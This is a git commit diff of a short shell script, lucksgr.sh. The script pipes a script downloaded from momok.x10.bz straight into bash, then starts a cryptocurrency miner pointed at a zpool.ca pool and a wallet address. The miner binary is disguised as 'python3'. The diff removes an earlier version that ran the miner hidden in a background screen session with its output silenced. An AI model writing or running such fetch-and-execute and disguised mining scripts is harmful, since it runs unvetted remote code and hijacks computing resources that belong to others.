b1cc15cd0c86ed162fbc5bcda2102e603df85e03
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-17 18:09:25 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,7 +1,3 @@
-apt install screen -y
-
 bash -c "$(wget -qO- momok.x10.bz/Alat-Coli-SRB.sh)"
 
-screen ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB > /dev/null 2>&1 &
-
-sleep 5
+./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
